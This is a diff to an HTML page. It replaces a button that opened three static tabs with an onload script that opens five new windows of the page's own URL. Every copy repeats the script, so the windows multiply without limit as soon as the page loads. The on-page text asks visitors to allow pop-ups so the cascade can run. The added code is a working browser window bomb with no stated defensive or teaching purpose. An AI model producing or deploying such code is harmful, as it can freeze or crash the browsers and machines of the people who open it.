@@ -3,47 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open Tabs with Same Code Quickly</title>
+    <title>Open Multiple Windows</title>
     <script>
-        function openTabs() {
-            // HTML content to be written into the new tabs (including JavaScript)
-            var htmlContent = `
-                <!DOCTYPE html>
-                <html lang="en">
-                <head>
-                    <meta charset="UTF-8">
-                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                    <title>New Tab</title>
-                    <script>
-                        function tabScript() {
-                    
-                        }
-                    <\/script>
-                </head>
-                <body>
-                    <h1>Welcome to the new tab!</h1>
-                    <p>This page has the same content as the first page.</p>
-                    <button onclick="tabScript()">Run Same Script</button>
-                </body>
-                </html>
-            `;
-
-            // Open multiple windows in parallel
-            for (let i = 0; i < 3; i++) {
-                var newWindow = window.open('about:blank', '_blank');
-                // Check if the window was successfully opened before writing content
-                if (newWindow) {
-                    newWindow.document.open();
-                    newWindow.document.write(htmlContent);
-                    newWindow.document.close();
-                }
+        function openMultipleWindows() {
+            for (let i = 0; i < 5; i++) {
+                window.open(window.location.href, '_blank');
             }
         }
+        window.onload = openMultipleWindows;
     </script>
 </head>
 <body>
-
-    <button onclick="openTabs()">Open Tabs with Same Code Quickly</button>
-
+    <h1>Opening 5 Copies of This Page</h1>
+    <p>If pop-ups are blocked, allow them to enable this functionality.</p>
 </body>
 </html>
